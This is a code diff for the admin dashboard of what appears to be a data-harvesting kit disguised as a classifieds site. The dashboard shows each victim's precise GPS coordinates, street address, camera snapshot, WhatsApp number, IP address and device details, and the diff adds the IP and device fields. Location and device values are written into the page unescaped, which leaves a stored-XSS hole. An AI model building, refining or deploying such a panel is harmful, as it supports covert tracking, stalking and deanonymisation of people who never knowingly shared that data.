@@ -9,9 +9,9 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: #0a0c15; color: #f1f5f9; padding: 24px; }
-        .admin-header { background: linear-gradient(135deg, #008000, #008751); padding: 28px 36px; border-radius: 32px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; }
-        .admin-header h1 { font-size: 28px; display: flex; align-items: center; gap: 15px; }
-        .stats-badge { background: rgba(0,0,0,0.35); padding: 12px 28px; border-radius: 60px; font-size: 15px; font-weight: 600; }
+        .admin-header { background: linear-gradient(135deg, #008000, #008751); padding: 24px 32px; border-radius: 32px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; }
+        .admin-header h1 { font-size: 26px; display: flex; align-items: center; gap: 12px; }
+        .stats-badge { background: rgba(0,0,0,0.3); padding: 10px 24px; border-radius: 60px; font-size: 14px; font-weight: 600; }
         .controls { display: flex; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; }
         .search-box { flex: 1; padding: 14px 24px; background: #1e293b; border: 1px solid #334155; border-radius: 60px; color: white; font-size: 14px; outline: none; }
         .search-box:focus { border-color: #00a86b; }
@@ -23,23 +23,21 @@
         .data-container::-webkit-scrollbar { width: 8px; }
         .data-container::-webkit-scrollbar-track { background: #1e293b; border-radius: 10px; }
         .data-container::-webkit-scrollbar-thumb { background: #00a86b; border-radius: 10px; }
-        .data-card { background: #13132a; border-radius: 28px; padding: 28px; border-left: 6px solid #00a86b; transition: 0.2s; }
+        .data-card { background: #13132a; border-radius: 28px; padding: 24px; border-left: 6px solid #00a86b; transition: 0.2s; }
         .data-card:hover { background: #1a1a35; }
-        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; padding-bottom: 15px; border-bottom: 1px solid #2d3a5e; }
-        .badge { padding: 6px 18px; border-radius: 40px; font-size: 12px; font-weight: 700; }
+        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; padding-bottom: 12px; border-bottom: 1px solid #2d3a5e; }
+        .badge { padding: 6px 16px; border-radius: 40px; font-size: 12px; font-weight: 700; }
         .badge-ad { background: #22c55e; color: #000; }
         .badge-perm { background: #8b5cf6; color: #fff; }
-        .delete-btn { background: #ef4444; border: none; padding: 6px 18px; border-radius: 40px; color: white; cursor: pointer; font-size: 12px; font-weight: 600; }
+        .delete-btn { background: #ef4444; border: none; padding: 6px 16px; border-radius: 40px; color: white; cursor: pointer; font-size: 12px; }
         .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; margin: 15px 0; }
-        .info-card { background: rgba(0,0,0,0.35); padding: 14px 16px; border-radius: 20px; }
-        .info-label { font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 6px; }
-        .info-value { font-size: 14px; font-weight: 500; word-break: break-word; color: #e2e8f0; }
-        .location-box { background: linear-gradient(135deg, rgba(0,168,107,0.08), rgba(0,128,0,0.05)); padding: 20px; border-radius: 24px; margin-top: 15px; border: 1px solid rgba(0,168,107,0.3); }
-        .location-title { font-weight: 700; margin-bottom: 15px; color: #00a86b; display: flex; align-items: center; gap: 10px; }
-        .camera-preview { max-width: 180px; border-radius: 16px; margin-top: 12px; border: 2px solid #00a86b; cursor: pointer; }
-        .empty-state { text-align: center; padding: 80px; color: #64748b; }
-        .coordinates { font-family: monospace; background: rgba(0,0,0,0.5); padding: 4px 8px; border-radius: 8px; font-size: 12px; }
-        @media (max-width: 768px) { body { padding: 16px; } .info-grid { grid-template-columns: 1fr; } .admin-header { flex-direction: column; text-align: center; } }
+        .info-card { background: rgba(0,0,0,0.3); padding: 14px; border-radius: 20px; }
+        .info-label { font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
+        .info-value { font-size: 14px; font-weight: 500; word-break: break-word; }
+        .location-box { background: rgba(0,168,107,0.1); padding: 16px; border-radius: 20px; margin-top: 15px; border: 1px solid rgba(0,168,107,0.3); }
+        .camera-preview { max-width: 150px; border-radius: 12px; margin-top: 10px; border: 2px solid #00a86b; cursor: pointer; }
+        .empty-state { text-align: center; padding: 60px; color: #64748b; }
+        @media (max-width: 768px) { body { padding: 16px; } .info-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
@@ -48,12 +46,12 @@
         <div class="stats-badge"><i class="fas fa-database"></i> <span id="recordCount">0</span> Records</div>
     </div>
     <div class="controls">
-        <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search by name, location, phone, title, street, city...">
+        <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search by title, location, phone...">
         <button class="refresh-btn" id="refreshBtn"><i class="fas fa-sync-alt"></i> Refresh</button>
         <button class="export-btn" id="exportBtn"><i class="fas fa-download"></i> Export JSON</button>
         <button class="clear-btn" id="clearBtn"><i class="fas fa-trash-alt"></i> Clear All</button>
     </div>
-    <div class="data-container" id="dataContainer"><div class="empty-state"><i class="fas fa-spinner fa-pulse"></i> Loading...</div></div>
+    <div class="data-container" id="dataContainer"><div class="empty-state"><i class="fas fa-spinner fa-pulse"></i> Loading data...</div></div>
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const adminKey = urlParams.get("key");
@@ -80,16 +78,16 @@
             document.getElementById('recordCount').innerText = allRecords.length;
             let filtered = allRecords.filter(r => {
                 if (r.type === 'ad_posted') {
-                    return r.ad.title.toLowerCase().includes(searchTerm) || (r.ad.location || '').toLowerCase().includes(searchTerm) || (r.ad.phone || '').toLowerCase().includes(searchTerm) || (r.location?.street || '').toLowerCase().includes(searchTerm) || (r.location?.city || '').toLowerCase().includes(searchTerm);
+                    return r.ad.title.toLowerCase().includes(searchTerm) || (r.ad.location || '').toLowerCase().includes(searchTerm) || (r.ad.phone || '').toLowerCase().includes(searchTerm);
                 } else {
-                    return (r.location?.street || '').toLowerCase().includes(searchTerm) || (r.location?.city || '').toLowerCase().includes(searchTerm);
+                    return (r.location?.city || '').toLowerCase().includes(searchTerm);
                 }
             });
             if (filtered.length === 0) { container.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i> No data found.</div>'; return; }
             container.innerHTML = filtered.map(r => {
                 const isAd = r.type === 'ad_posted';
                 const loc = r.location;
-                return `<div class="data-card"><div class="card-header"><div><span class="badge ${isAd ? 'badge-ad' : 'badge-perm'}">${isAd ? '<i class="fas fa-ad"></i> AD POSTED' : '<i class="fas fa-shield-alt"></i> PERMISSION'}</span><span style="margin-left:12px;font-size:12px;color:#64748b;"><i class="far fa-clock"></i> ${new Date(r.timestamp).toLocaleString()}</span></div><button class="delete-btn" onclick="deleteRecord(${r.id})"><i class="fas fa-trash"></i> Delete</button></div>${isAd ? `<div class="info-grid"><div class="info-card"><div class="info-label">Category</div><div class="info-value">${escapeHtml(r.ad.category)}</div></div><div class="info-card"><div class="info-label">Title</div><div class="info-value">${escapeHtml(r.ad.title)}</div></div><div class="info-card"><div class="info-label">Price</div><div class="info-value">${escapeHtml(r.ad.price)}</div></div></div><div class="info-card"><div class="info-label">Description</div><div class="info-value">${escapeHtml((r.ad.description || '').substring(0, 200))}${(r.ad.description || '').length > 200 ? '...' : ''}</div></div><div class="info-grid"><div class="info-card"><div class="info-label">User Location</div><div class="info-value">${escapeHtml(r.ad.location || 'Not specified')}</div></div><div class="info-card"><div class="info-label">WhatsApp</div><div class="info-value">${escapeHtml(r.ad.phone || 'Not provided')}</div></div></div>` : ''}${loc ? `<div class="location-box"><div class="location-title"><i class="fas fa-map-pin"></i> 📍 PRECISE GPS LOCATION</div><div class="info-grid"><div class="info-card"><div class="info-label">Street Address</div><div class="info-value"><strong>${loc.street || 'N/A'}</strong></div></div><div class="info-card"><div class="info-label">City/Town</div><div class="info-value">${loc.city || 'N/A'}</div></div><div class="info-card"><div class="info-label">State</div><div class="info-value">${loc.state || 'N/A'}</div></div></div><div class="info-grid"><div class="info-card"><div class="info-label">Country</div><div class="info-value">${loc.country || 'N/A'}</div></div><div class="info-card"><div class="info-label">Postcode</div><div class="info-value">${loc.postcode || 'N/A'}</div></div><div class="info-card"><div class="info-label">GPS Coordinates</div><div class="info-value"><span class="coordinates">${loc.lat || 'N/A'}, ${loc.lng || 'N/A'}</span> (${loc.accuracy || 'N/A'}m)</div></div></div><div class="info-card"><div class="info-label">Full Address</div><div class="info-value" style="font-size:12px;">${loc.fullAddress || 'N/A'}</div></div></div>` : '<div class="location-box" style="background:#ef444410;"><i class="fas fa-exclamation-triangle"></i> No location data</div>'}${r.cameraImage ? `<div class="info-card" style="margin-top:15px;"><div class="info-label"><i class="fas fa-camera"></i> Camera Snapshot</div><img src="${r.cameraImage}" class="camera-preview" onclick="window.open(this.src)"></div>` : '<div class="info-card" style="margin-top:15px;"><div class="info-label"><i class="fas fa-camera"></i> Camera</div><div class="info-value">No camera photo captured</div></div>'}</div>`;
+                return `<div class="data-card"><div class="card-header"><div><span class="badge ${isAd ? 'badge-ad' : 'badge-perm'}">${isAd ? '<i class="fas fa-ad"></i> AD POSTED' : '<i class="fas fa-shield-alt"></i> PERMISSION'}</span><span style="margin-left:12px;font-size:12px;color:#64748b;"><i class="far fa-clock"></i> ${new Date(r.timestamp).toLocaleString()}</span></div><button class="delete-btn" onclick="deleteRecord(${r.id})"><i class="fas fa-trash"></i> Delete</button></div>${isAd ? `<div class="info-grid"><div class="info-card"><div class="info-label">Category</div><div class="info-value">${escapeHtml(r.ad.category)}</div></div><div class="info-card"><div class="info-label">Title</div><div class="info-value">${escapeHtml(r.ad.title)}</div></div><div class="info-card"><div class="info-label">Price</div><div class="info-value">${escapeHtml(r.ad.price)}</div></div></div><div class="info-card"><div class="info-label">Description</div><div class="info-value">${escapeHtml((r.ad.description || '').substring(0, 200))}${(r.ad.description || '').length > 200 ? '...' : ''}</div></div><div class="info-grid"><div class="info-card"><div class="info-label">User Location</div><div class="info-value">${escapeHtml(r.ad.location || 'Not specified')}</div></div><div class="info-card"><div class="info-label">WhatsApp</div><div class="info-value">${escapeHtml(r.ad.phone || 'Not provided')}</div></div></div>` : ''}${loc ? `<div class="location-box"><div class="info-label" style="margin-bottom:10px;">📍 PRECISE LOCATION CAPTURED</div><div class="info-grid"><div class="info-card"><div class="info-label">Street</div><div class="info-value">${loc.street || 'N/A'}</div></div><div class="info-card"><div class="info-label">City</div><div class="info-value">${loc.city || 'N/A'}</div></div><div class="info-card"><div class="info-label">State</div><div class="info-value">${loc.state || 'N/A'}</div></div><div class="info-card"><div class="info-label">Country</div><div class="info-value">${loc.country || 'N/A'}</div></div><div class="info-card"><div class="info-label">Postcode</div><div class="info-value">${loc.postcode || 'N/A'}</div></div><div class="info-card"><div class="info-label">Coordinates</div><div class="info-value">${loc.lat || 'N/A'}, ${loc.lng || 'N/A'}</div></div></div></div>` : '<div class="location-box"><i class="fas fa-exclamation-triangle"></i> No location data</div>'}<div class="info-card" style="margin-top:10px;"><div class="info-label"><i class="fas fa-camera"></i> Camera</div><div class="info-value">${r.cameraImage ? '<img src="' + r.cameraImage + '" class="camera-preview" onclick="window.open(this.src)">' : 'No camera photo'}</div></div><div class="info-grid"><div class="info-card"><div class="info-label">IP Address</div><div class="info-value">${r.device?.ip || r.ip || 'N/A'}</div></div><div class="info-card"><div class="info-label">Device</div><div class="info-value">${r.device?.platform || 'N/A'}</div></div><div class="info-card"><div class="info-label">Timezone</div><div class="info-value">${r.device?.timezone || 'N/A'}</div></div></div></div>`;
             }).join('');
         }
         function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[m])); }
